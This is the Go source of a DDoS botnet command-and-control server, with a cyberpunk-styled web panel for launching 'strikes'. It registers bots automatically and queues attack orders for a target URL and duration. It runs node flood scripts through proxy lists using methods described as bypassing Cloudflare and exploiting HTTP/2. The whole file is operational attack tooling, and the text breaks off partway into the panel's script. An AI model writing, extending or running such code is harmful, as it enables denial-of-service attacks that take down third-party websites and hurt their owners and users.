package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"time"
)

type Bot struct {
	URL      string `json:"url"`
	Time     string `json:"time"`
	Approved bool   `json:"approved"`
	LastSeen int64  `json:"lastSeen"`
}

type AttackCommand struct {
	Action    string `json:"action"`
	Target    string `json:"target,omitempty"`
	Time      string `json:"time,omitempty"`
	Methods   string `json:"methods,omitempty"`
	Timestamp int64  `json:"timestamp,omitempty"`
}

type Server struct {
	connectedBots []Bot
	pendingCmds   map[string]AttackCommand
	stopCommands  map[string]bool
	blockedBots   map[string]bool
	mu            sync.RWMutex
	startTime     time.Time
}

func NewServer() *Server {
	return &Server{
		connectedBots: make([]Bot, 0),
		pendingCmds:   make(map[string]AttackCommand),
		stopCommands:  make(map[string]bool),
		blockedBots:   make(map[string]bool),
		startTime:     time.Now(),
	}
}

func (s *Server) isBlocked(url string) bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.blockedBots[url]
}

func (s *Server) registerBot(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		URL string `json:"url"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	if req.URL == "" {
		http.Error(w, "Bot URL required", http.StatusBadRequest)
		return
	}

	if s.isBlocked(req.URL) {
		log.Printf("[BLOCKED] Bot tried to register: %s", req.URL)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]interface{}{
			"error":    "Bot is blocked",
			"approved": false,
			"message":  "This bot has been permanently blocked by the server",
		})
		return
	}

	s.mu.Lock()
	defer s.mu.Unlock()

	for i := range s.connectedBots {
		if s.connectedBots[i].URL == req.URL {
			s.connectedBots[i].LastSeen = time.Now().UnixMilli()
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{
				"message":  "Bot already registered",
				"approved": true,
			})
			return
		}
	}

	newBot := Bot{
		URL:      req.URL,
		Time:     time.Now().Format("15:04:05"),
		Approved: true,
		LastSeen: time.Now().UnixMilli(),
	}

	s.connectedBots = append(s.connectedBots, newBot)
	log.Printf("[AUTO-APPROVED] New bot registered: %s", req.URL)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"message":  "Bot auto-approved and registered successfully",
		"approved": true,
		"bot":      newBot,
	})
}

func (s *Server) getCommand(w http.ResponseWriter, r *http.Request) {
	botURL := r.URL.Query().Get("botUrl")
	if botURL == "" {
		http.Error(w, "Bot URL required", http.StatusBadRequest)
		return
	}

	s.mu.Lock()
	for i := range s.connectedBots {
		if s.connectedBots[i].URL == botURL {
			s.connectedBots[i].LastSeen = time.Now().UnixMilli()
			break
		}
	}

	if s.stopCommands[botURL] {
		delete(s.stopCommands, botURL)
		s.mu.Unlock()
		log.Printf("[STOP-SENT] Sending stop command to %s", botURL)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"hasCommand": true,
			"command":    map[string]string{"action": "stop"},
		})
		return
	}

	if cmd, exists := s.pendingCmds[botURL]; exists {
		delete(s.pendingCmds, botURL)
		s.mu.Unlock()
		log.Printf("[COMMAND-SENT] Sending command to %s: %s", botURL, cmd.Methods)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"hasCommand": true,
			"command":    cmd,
		})
		return
	}

	s.mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"hasCommand": false,
	})
}

func (s *Server) getBots(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"bots": s.connectedBots,
	})
}

func (s *Server) ping(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"alive":     true,
		"timestamp": time.Now().UnixMilli(),
		"status":    "online",
	})
}

func (s *Server) attackBot(w http.ResponseWriter, r *http.Request) {
	bot := r.URL.Query().Get("bot")
	target := r.URL.Query().Get("target")
	timeStr := r.URL.Query().Get("time")
	methods := r.URL.Query().Get("methods")

	if bot == "" || target == "" || timeStr == "" || methods == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "Missing parameters",
		})
		return
	}

	log.Printf("[QUEUE-COMMAND] Queuing %s for %s", methods, bot)

	s.mu.Lock()
	s.pendingCmds[bot] = AttackCommand{
		Action:    "attack",
		Target:    target,
		Time:      timeStr,
		Methods:   methods,
		Timestamp: time.Now().UnixMilli(),
	}
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Command queued for bot",
	})
}

func (s *Server) stopBot(w http.ResponseWriter, r *http.Request) {
	bot := r.URL.Query().Get("bot")
	if bot == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "Bot URL required",
		})
		return
	}

	log.Printf("[QUEUE-STOP] Queuing stop command for %s", bot)

	s.mu.Lock()
	delete(s.pendingCmds, bot)
	s.stopCommands[bot] = true
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Stop command queued for bot",
	})
}

func (s *Server) stopAll(w http.ResponseWriter, r *http.Request) {
	log.Println("[STOP-ALL] Queuing stop for all bots")

	s.mu.Lock()
	s.pendingCmds = make(map[string]AttackCommand)
	for _, bot := range s.connectedBots {
		s.stopCommands[bot.URL] = true
	}
	count := len(s.connectedBots)
	s.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": fmt.Sprintf("Stop queued for %d bots", count),
	})
}

func (s *Server) blockBot(w http.ResponseWriter, r *http.Request) {
	bot := r.URL.Query().Get("bot")
	if bot == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "Bot URL required",
		})
		return
	}

	s.mu.Lock()
	s.blockedBots[bot] = true

	newBots := make([]Bot, 0)
	for _, b := range s.connectedBots {
		if b.URL != bot {
			newBots = append(newBots, b)
		}
	}
	s.connectedBots = newBots

	delete(s.pendingCmds, bot)
	delete(s.stopCommands, bot)
	s.mu.Unlock()

	log.Printf("[BLOCKED] Bot permanently blocked: %s", bot)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Bot blocked permanently",
		"bot":     bot,
	})
}

func (s *Server) unblockBot(w http.ResponseWriter, r *http.Request) {
	bot := r.URL.Query().Get("bot")
	if bot == "" {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"success": false,
			"error":   "Bot URL required",
		})
		return
	}

	s.mu.Lock()
	delete(s.blockedBots, bot)
	s.mu.Unlock()

	log.Printf("[UNBLOCKED] Bot unblocked: %s", bot)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"message": "Bot unblocked",
		"bot":     bot,
	})
}

func (s *Server) getBlocked(w http.ResponseWriter, r *http.Request) {
	s.mu.RLock()
	blocked := make([]string, 0, len(s.blockedBots))
	for bot := range s.blockedBots {
		blocked = append(blocked, bot)
	}
	s.mu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"blocked": blocked,
	})
}

func (s *Server) attack(w http.ResponseWriter, r *http.Request) {
	target := r.URL.Query().Get("target")
	timeStr := r.URL.Query().Get("time")
	methods := r.URL.Query().Get("methods")

	if target == "" || timeStr == "" || methods == "" {
		http.Error(w, "Missing required parameters: target, time, methods", http.StatusBadRequest)
		return
	}

	log.Printf("\n[SERVER-ATTACK] %s -> %s for %ss\n", methods, target, timeStr)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"message": "Server attack launched successfully",
		"target":  target,
		"time":    timeStr,
		"methods": methods,
		"server":  "executing",
	})

	go s.executeAttack(target, timeStr, methods)
}

func (s *Server) executeAttack(target, timeStr, methods string) {
	runCmd := func(cmdStr string) {
		log.Printf("[EXEC] %s", cmdStr)
		cmd := exec.Command("sh", "-c", cmdStr)
		if err := cmd.Start(); err != nil {
			log.Printf("[ERROR] %v", err)
		}
	}

	switch methods {
	case "CF-BYPASS":
		log.Println("[OK] Executing CF-BYPASS")
		runCmd(fmt.Sprintf("node methods/cf-bypass.js %s %s 4 32 proxy.txt", target, timeStr))

	case "MODERN-FLOOD":
		log.Println("[OK] Executing MODERN-FLOOD")
		runCmd(fmt.Sprintf("node methods/modern-flood.js %s %s 4 64 proxy.txt", target, timeStr))

	case "HTTP-SICARIO":
		log.Println("[OK] Executing HTTP-SICARIO")
		runCmd(fmt.Sprintf("node methods/REX-COSTUM.js %s %s 32 6 proxy.txt --randrate --full --legit --query 1", target, timeStr))
		runCmd(fmt.Sprintf("node methods/cibi.js %s %s 16 3 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/BYPASS.js %s %s 32 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/nust.js %s %s 12 4 proxy.txt", target, timeStr))

	case "RAW-HTTP":
		log.Println("[OK] Executing RAW-HTTP")
		runCmd(fmt.Sprintf("node methods/h2-nust %s %s 15 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/http-panel.js %s %s", target, timeStr))

	case "R9":
		log.Println("[OK] Executing R9")
		runCmd(fmt.Sprintf("node methods/high-dstat.js %s %s 32 7 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/w-flood1.js %s %s 8 3 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/vhold.js %s %s 16 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/nust.js %s %s 16 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/BYPASS.js %s %s 8 1 proxy.txt", target, timeStr))

	case "PRIV-TOR":
		log.Println("[OK] Executing PRIV-TOR")
		runCmd(fmt.Sprintf("node methods/w-flood1.js %s %s 64 6 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/high-dstat.js %s %s 16 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/cibi.js %s %s 12 4 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/BYPASS.js %s %s 10 4 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/nust.js %s %s 10 1 proxy.txt", target, timeStr))

	case "HOLD-PANEL":
		log.Println("[OK] Executing HOLD-PANEL")
		runCmd(fmt.Sprintf("node methods/http-panel.js %s %s", target, timeStr))

	case "R1":
		log.Println("[OK] Executing R1")
		runCmd(fmt.Sprintf("node methods/vhold.js %s %s 15 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/high-dstat.js %s %s 64 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/cibi.js %s %s 4 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/BYPASS.js %s %s 16 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/REX-COSTUM.js %s %s 32 6 proxy.txt --randrate --full --legit --query 1", target, timeStr))
		runCmd(fmt.Sprintf("node methods/w-flood1.js %s %s 8 3 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/vhold.js %s %s 16 2 proxy.txt", target, timeStr))
		runCmd(fmt.Sprintf("node methods/nust.js %s %s 32 3 proxy.txt", target, timeStr))

	case "UAM":
		log.Println("[OK] Executing UAM")
		runCmd(fmt.Sprintf("node methods/uam.js %s %s 5 4 6", target, timeStr))

	case "W.I.L":
		log.Println("[OK] Executing W.I.L - Web Intensive Load")
		runCmd(fmt.Sprintf("node methods/wil.js %s %s 10 8 4", target, timeStr))
	}
}

func (s *Server) home(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, gamingUI)
}

const gamingUI = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ CYBER OPS COMMAND CENTER</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { font-family: 'Rajdhani', sans-serif; }
        .orbitron { font-family: 'Orbitron', sans-serif; }
        
        @keyframes scan { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(100%); } }
        @keyframes pulse-ring { 0% { transform: scale(0.95); opacity: 1; } 50% { transform: scale(1); opacity: 0.7; } 100% { transform: scale(0.95); opacity: 1; } }
        @keyframes neon-glow { 0%, 100% { text-shadow: 0 0 10px #0ff, 0 0 20px #0ff, 0 0 30px #0ff; } 50% { text-shadow: 0 0 20px #0ff, 0 0 30px #0ff, 0 0 40px #0ff, 0 0 50px #0ff; } }
        @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
        @keyframes matrix-fall { 0% { transform: translateY(-100%); opacity: 0; } 50% { opacity: 1; } 100% { transform: translateY(100vh); opacity: 0; } }
        @keyframes scanner { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
        @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
        
        .scan-line { animation: scan 3s linear infinite; }
        .pulse-ring { animation: pulse-ring 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
        .neon-text { animation: neon-glow 2s ease-in-out infinite; }
        .glitch-effect:hover { animation: glitch 0.3s infinite; }
        .scanner-line { animation: scanner 3s linear infinite; }
        .float-anim { animation: float 3s ease-in-out infinite; }
        
        .cyber-border { 
            border: 2px solid;
            border-image: linear-gradient(45deg, #00ffff, #ff00ff, #00ffff) 1;
            position: relative;
        }
        
        .cyber-border::before {
            content: '';
            position: absolute;
            inset: -2px;
            background: linear-gradient(45deg, #00ffff, #ff00ff);
            border-radius: inherit;
            opacity: 0;
            transition: opacity 0.3s;
            z-index: -1;
        }
        
        .cyber-border:hover::before { opacity: 0.2; }
        
        .grid-bg {
            background-image: 
                linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px);
            background-size: 30px 30px;
        }
        
        .hologram {
            background: linear-gradient(180deg, rgba(0,255,255,0.1) 0%, transparent 100%);
            backdrop-filter: blur(10px);
        }
        
        .terminal-window {
            background: linear-gradient(135deg, rgba(0,0,0,0.9) 0%, rgba(0,20,40,0.9) 100%);
            border: 1px solid rgba(0,255,255,0.3);
            box-shadow: 0 0 30px rgba(0,255,255,0.2), inset 0 0 30px rgba(0,255,255,0.05);
        }
        
        .stat-card {
            background: linear-gradient(135deg, rgba(0,50,100,0.3) 0%, rgba(0,20,40,0.5) 100%);
            border: 1px solid rgba(0,255,255,0.2);
            transition: all 0.3s;
        }
        
        .stat-card:hover {
            border-color: rgba(0,255,255,0.6);
            box-shadow: 0 0 20px rgba(0,255,255,0.3);
            transform: translateY(-2px);
        }
        
        body { 
            background: #000;
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(0, 50, 100, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(100, 0, 50, 0.3) 0%, transparent 50%);
        }
        
        .btn-cyber {
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
        }
        
        .btn-cyber::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }
        
        .btn-cyber:hover::before { left: 100%; }
        
        .method-badge {
            background: linear-gradient(135deg, rgba(0,255,255,0.2) 0%, rgba(255,0,255,0.2) 100%);
            border: 1px solid rgba(0,255,255,0.5);
            transition: all 0.3s;
        }
        
        .method-badge:hover {
            background: linear-gradient(135deg, rgba(0,255,255,0.4) 0%, rgba(255,0,255,0.4) 100%);
            box-shadow: 0 0 15px rgba(0,255,255,0.5);
            transform: scale(1.05);
        }
        
        .log-entry {
            border-left: 2px solid rgba(0,255,255,0.3);
            transition: all 0.2s;
        }
        
        .log-entry:hover {
            border-left-color: rgba(0,255,255,1);
            background: rgba(0,255,255,0.05);
        }
        
        input, select {
            background: rgba(0,20,40,0.6) !important;
            border: 1px solid rgba(0,255,255,0.3) !important;
            transition: all 0.3s !important;
        }
        
        input:focus, select:focus {
            border-color: rgba(0,255,255,0.8) !important;
            box-shadow: 0 0 15px rgba(0,255,255,0.3) !important;
        }
        
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: rgba(0,20,40,0.5); }
        ::-webkit-scrollbar-thumb { 
            background: linear-gradient(180deg, #00ffff 0%, #ff00ff 100%);
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover { background: linear-gradient(180deg, #00ffff 0%, #ff00ff 100%); }
    </style>
</head>
<body class="text-white min-h-screen relative overflow-x-hidden">
    <!-- Animated Background Grid -->
    <div class="fixed inset-0 grid-bg opacity-20 pointer-events-none"></div>
    
    <!-- Scanner Line Effect -->
    <div class="fixed inset-0 pointer-events-none overflow-hidden">
        <div class="scanner-line absolute w-full h-0.5 bg-gradient-to-r from-transparent via-cyan-500 to-transparent opacity-30"></div>
    </div>

    <!-- Main Container -->
    <div class="relative z-10">
        <!-- Header -->
        <div class="border-b border-cyan-500/30 bg-black/80 backdrop-blur-md sticky top-0 z-50">
            <div class="max-w-[1920px] mx-auto px-8 py-6">
                <div class="flex items-center justify-between">
                    <div class="flex items-center gap-6">
                        <div class="relative">
                            <div class="w-16 h-16 rounded-lg bg-gradient-to-br from-cyan-500 to-purple-600 flex items-center justify-center pulse-ring">
                                <svg class="w-10 h-10" fill="currentColor" viewBox="0 0 20 20">
                                    <path d="M13 7H7v6h6V7z"/>
                                    <path fill-rule="evenodd" d="M7 2a1 1 0 012 0v1h2V2a1 1 0 112 0v1h2a2 2 0 012 2v2h1a1 1 0 110 2h-1v2h1a1 1 0 110 2h-1v2a2 2 0 01-2 2h-2v1a1 1 0 11-2 0v-1H9v1a1 1 0 11-2 0v-1H5a2 2 0 01-2-2v-2H2a1 1 0 110-2h1V9H2a1 1 0 010-2h1V5a2 2 0 012-2h2V2zM5 5h10v10H5V5z" clip-rule="evenodd"/>
                                </svg>
                            </div>
                            <div class="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full animate-pulse"></div>
                        </div>
                        <div>
                            <h1 class="text-4xl font-black orbitron bg-gradient-to-r from-cyan-400 via-purple-500 to-pink-500 bg-clip-text text-transparent neon-text">
                                CYBER OPS COMMAND
                            </h1>
                            <p class="text-cyan-400/70 text-sm tracking-widest mt-1">TACTICAL NETWORK CONTROL SYSTEM v3.7</p>
                        </div>
                    </div>
                    <div class="text-right">
                        <div class="text-xs text-cyan-400/50 tracking-wider mb-1">ACTIVE UNITS</div>
                        <div class="flex items-center gap-3 justify-end">
                            <div class="w-3 h-3 bg-green-500 rounded-full pulse-ring"></div>
                            <span class="text-5xl font-bold orbitron bg-gradient-to-r from-green-400 to-cyan-400 bg-clip-text text-transparent" id="botCount">0</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="max-w-[1920px] mx-auto px-8 py-8">
            <div class="grid grid-cols-1 xl:grid-cols-3 gap-6">
                <!-- Main Control Area -->
                <div class="xl:col-span-2 space-y-6">
                    <!-- Connected Bots -->
                    <div class="terminal-window rounded-xl overflow-hidden">
                        <div class="bg-gradient-to-r from-cyan-500/20 to-purple-500/20 px-6 py-4 border-b border-cyan-500/30 flex items-center justify-between">
                            <div class="flex items-center gap-3">
                                <div class="w-3 h-3 bg-green-500 rounded-full pulse-ring"></div>
                                <h2 class="text-2xl font-bold orbitron text-cyan-400">CONNECTED UNITS</h2>
                            </div>
                            <span class="text-xs bg-green-500/20 text-green-400 px-3 py-1 rounded-full border border-green-500/50 orbitron">AUTO-SYNC ENABLED</span>
                        </div>
                        <div class="p-6">
                            <div id="botsList" class="space-y-3 max-h-80 overflow-y-auto">
                                <p class="text-cyan-400/50 text-center py-16 text-lg">⚡ AWAITING UNIT CONNECTION...</p>
                            </div>
                        </div>
                    </div>

                    <!-- Blocked Units -->
                    <div class="terminal-window rounded-xl overflow-hidden">
                        <div class="bg-gradient-to-r from-red-500/20 to-orange-500/20 px-6 py-4 border-b border-red-500/30">
                            <div class="flex items-center gap-3">
                                <div class="w-3 h-3 bg-red-500 rounded-full"></div>
                                <h2 class="text-2xl font-bold orbitron text-red-400">BLOCKED UNITS</h2>
                            </div>
                        </div>
                        <div class="p-6">
                            <div id="blockedList" class="space-y-3 max-h-48 overflow-y-auto">
                                <p class="text-red-400/50 text-center py-8 text-sm">NO BLOCKED UNITS</p>
                            </div>
                        </div>
                    </div>

                    <!-- Attack Control -->
                    <div class="terminal-window rounded-xl overflow-hidden">
                        <div class="bg-gradient-to-r from-red-500/20 to-purple-500/20 px-6 py-4 border-b border-red-500/30">
                            <h2 class="text-2xl font-bold orbitron text-red-400">⚔️ TACTICAL STRIKE CONTROL</h2>
                        </div>
                        <div class="p-6 space-y-5">
                            <div>
                                <label class="block text-sm font-bold text-cyan-400 mb-2 orbitron tracking-wider">TARGET URL</label>
                                <input type="text" id="target" 
                                    class="w-full rounded-lg px-4 py-3 text-white font-mono text-lg focus:outline-none" 
                                    placeholder="https://target.domain.com">
                            </div>

                            <div class="grid grid-cols-2 gap-4">
                                <div>
                                    <label class="block text-sm font-bold text-cyan-400 mb-2 orbitron tracking-wider">DURATION (SEC)</label>
                                    <input type="number" id="time" value="60" 
                                        class="w-full rounded-lg px-4 py-3 text-white font-mono text-lg focus:outline-none" 
                                        min="1">
                                </div>
                                <div>
                                    <label class="block text-sm font-bold text-cyan-400 mb-2 orbitron tracking-wider">STRIKE METHOD</label>
                                    <select id="method" 
                                        class="w-full rounded-lg px-4 py-3 text-white font-mono text-lg focus:outline-none">
                                        <option>CF-BYPASS</option>
                                        <option>MODERN-FLOOD</option>
                                        <option>HTTP-SICARIO</option>
                                        <option>RAW-HTTP</option>
                                        <option>R9</option>
                                        <option>PRIV-TOR</option>
                                        <option>HOLD-PANEL</option>
                                        <option>R1</option>
                                        <option>UAM</option>
                                        <option>W.I.L</option>
                                    </select>
                                </div>
                            </div>

                            <div class="grid grid-cols-2 gap-3">
                                <button onclick="attackAll()" id="attackBtn" 
                                    class="btn-cyber bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white font-bold py-4 px-6 rounded-lg orbitron tracking-wider text-lg shadow-lg shadow-red-500/50 border border-red-400/50">
                                    ⚔️ LAUNCH STRIKE
                                </button>
                                <button onclick="stopAll()" id="stopBtn" 
                                    class="btn-cyber bg-gradient-to-r from-orange-600 to-yellow-600 hover:from-orange-500 hover:to-yellow-500 text-white font-bold py-4 px-6 rounded-lg orbitron tracking-wider text-lg shadow-lg shadow-orange-500/50 border border-orange-400/50">
                                    🛑 ABORT ALL
                                </button>
                            </div>
                            
                            <button onclick="attackServer()" id="serverBtn" 
                                class="w-full btn-cyber bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-4 px-6 rounded-lg orbitron tracking-wider text-lg shadow-lg shadow-purple-500/50 border border-purple-400/50">
                                💻 SERVER ATTACK
                            </button>

                            <div id="status" class="p-4 rounded-lg border border-cyan-500/30 bg-cyan-500/5 hidden">
                                <p class="text-sm font-mono"></p>
                            </div>
                        </div>
                    </div>

                    <!-- Activity Logs -->
                    <div class="terminal-window rounded-xl overflow-hidden">
                        <div class="bg-gradient-to-r from-purple-500/20 to-pink-500/20 px-6 py-4 border-b border-purple-500/30 flex items-center justify-between">
                            <h2 class="text-2xl font-bold orbitron text-purple-400">📡 OPERATION LOGS</h2>
                            <button onclick="clearLogs()" 
                                class="text-xs bg-purple-500/20 hover:bg-purple-500/40 px-3 py-1 rounded border border-purple-500/50 orbitron transition-all">
                                CLEAR
                            </button>
                        </div>
                        <div class="p-6">
                            <div id="logs" class="rounded-lg border border-cyan-500/20 p-4 h-96 overflow-y-auto font-mono text-sm bg-black/40">
                                <p class="text-cyan-400/50 text-center py-16">⚡ SYSTEM READY - NO ACTIVITY</p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Sidebar -->
                <div class="space-y-6">
                    <!-- Stats -->
                    <div class="terminal-window rounded-xl p-6">
                        <h3 class="text-xl font-bold orbitron text-cyan-400 mb-6 tracking-wider">⚡ SYSTEM STATUS</h3>
                        <div class="space-y-4">
                            <div class="stat-card p-4 rounded-lg">
                                <div class="flex justify-between items-center">
                                    <span class="text-cyan-400/70 text-sm orbitron">TOTAL UNITS</span>
                                    <span class="text-cyan-400 font-bold text-2xl orbitron" id="totalBots">0</span>
                                </div>
                            </div>
                            <div class="stat-card p-4 rounded-lg">
                                <div class="flex justify-between items-center">
                                    <span class="text-red-400/70 text-sm orbitron">ACTIVE STRIKES</span>
                                    <span class="text-red-400 font-bold text-2xl orbitron" id="activeAttacks">0</span>
                                </div>
                            </div>
                            <div class="stat-card p-4 rounded-lg">
                                <div class="flex justify-between items-center">
                                    <span class="text-green-400/70 text-sm orbitron">TOTAL OPERATIONS</span>
                                    <span class="text-green-400 font-bold text-2xl orbitron" id="totalAttacks">0</span>
                                </div>
                            </div>
                            <div class="stat-card p-4 rounded-lg">
                                <div class="flex justify-between items-center">
                                    <span class="text-purple-400/70 text-sm orbitron">UPTIME</span>
                                    <span class="text-purple-400 font-bold text-xl orbitron" id="uptime">0s</span>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Quick Actions -->
                    <div class="terminal-window rounded-xl p-6">
                        <h3 class="text-xl font-bold orbitron text-cyan-400 mb-6 tracking-wider">⚡ QUICK ACTIONS</h3>
                        <div class="space-y-3">
                            <button onclick="refreshBots()" 
                                class="w-full btn-cyber bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-400 py-3 px-4 rounded-lg border border-cyan-500/50 orbitron text-sm tracking-wider transition-all">
                                🔄 REFRESH UNITS
                            </button>
                            <button onclick="removeAllBots()" 
                                class="w-full btn-cyber bg-red-500/20 hover:bg-red-500/30 text-red-400 py-3 px-4 rounded-lg border border-red-500/50 orbitron text-sm tracking-wider transition-all">
                                ❌ REMOVE ALL UNITS
                            </button>
                        </div>
                    </div>

                    <!-- Available Methods -->
                    <div class="terminal-window rounded-xl p-6">
                        <h3 class="text-xl font-bold orbitron text-cyan-400 mb-6 tracking-wider">⚔️ STRIKE METHODS</h3>
                        <div class="space-y-3 max-h-96 overflow-y-auto">
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-cyan-400 font-bold text-sm orbitron">CF-BYPASS</div>
                                <div class="text-cyan-400/50 text-xs mt-1">CloudFlare Protection Breach</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-purple-400 font-bold text-sm orbitron">MODERN-FLOOD</div>
                                <div class="text-purple-400/50 text-xs mt-1">HTTP/2 Vulnerability Exploit</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-red-400 font-bold text-sm orbitron">HTTP-SICARIO</div>
                                <div class="text-red-400/50 text-xs mt-1">Advanced Multi-Vector Strike</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-orange-400 font-bold text-sm orbitron">RAW-HTTP</div>
                                <div class="text-orange-400/50 text-xs mt-1">Direct Protocol Assault</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-yellow-400 font-bold text-sm orbitron">R9</div>
                                <div class="text-yellow-400/50 text-xs mt-1">Rapid Response Protocol</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-green-400 font-bold text-sm orbitron">PRIV-TOR</div>
                                <div class="text-green-400/50 text-xs mt-1">Anonymous Network Strike</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-blue-400 font-bold text-sm orbitron">HOLD-PANEL</div>
                                <div class="text-blue-400/50 text-xs mt-1">Sustained Connection Lock</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-indigo-400 font-bold text-sm orbitron">R1</div>
                                <div class="text-indigo-400/50 text-xs mt-1">Maximum Intensity Protocol</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-pink-400 font-bold text-sm orbitron">UAM</div>
                                <div class="text-pink-400/50 text-xs mt-1">Advanced CF Bypass + Puppeteer</div>
                            </div>
                            <div class="method-badge p-3 rounded-lg cursor-pointer">
                                <div class="text-fuchsia-400 font-bold text-sm orbitron">W.I.L</div>
                                <div class="text-fuchsia-400/50 text-xs mt-1">Web Intensive Load - Ultimate</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let bots = [];
        let blockedBots = [];
        let totalAttacks = 0;
        let activeAttacks = 0;
